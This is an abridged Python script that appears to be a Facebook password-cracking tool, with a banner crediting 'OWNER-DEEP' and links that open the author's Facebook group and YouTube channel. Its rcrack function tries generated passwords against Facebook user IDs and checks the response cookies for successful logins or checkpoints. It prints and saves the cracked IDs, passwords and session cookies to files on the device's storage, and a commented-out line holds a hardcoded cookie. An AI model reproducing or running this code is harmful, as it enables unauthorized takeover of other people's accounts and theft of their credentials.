...
88  `8D 88'     88'     88  `8D 
88   88 88ooooo 88ooooo 88oodD' 
88   88 88~~~~~ 88~~~~~ 88~~~   
88  .8D 88.     88.     88      
Y8888D' Y88888P Y88888P 88      
\033[1;37m══════════════════════════════════════════
[•]𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :»  𝐎𝐖𝐍𝐄𝐑-𝐃𝐄𝐄𝐏
[•]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   :»  𝐃𝐄𝐄𝐏
[•]𝐆𝐈𝐓𝐇𝐔𝐁     :»  𝐃𝐄𝐄𝐏-404
[•]𝐁𝐑𝐎𝐓𝐇𝐄𝐑    :»  𝐑𝐄𝐇𝐀𝐍 𝐌𝐀𝐋𝐈𝐊
[•]𝐕𝐄𝐑𝐒𝐈𝐎𝐍    :»  0.1
...
def i():
    ...
    os.getuid
    os.geteuid
    os.system('xdg-open https://facebook.com/groups/1133219663679996/')
    print(logo)
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    os.system('xdg-open https://youtube.com/@kingoffacebook07')
    print(logo)
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=7iksZPKtNfcRrzZU3cGPF2bt; sb=7iksZMGMlE48ROpNUrdMjvlC; fr=0zckiC0dV2ttcLgFw.AWXVxQCPUCrdAEtGbUV0Vui1hVw.BkLCnu.YN.AAA.0.0.BkMX9G.AWUDpTLNoE8; m_pixel_ratio=2; wd=360x666',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(𝐃𝐄𝐄𝐏-OK 💚)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝐃𝐄𝐄𝐏-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(𝐃𝐄𝐄𝐏-OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝐃𝐄𝐄𝐏-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
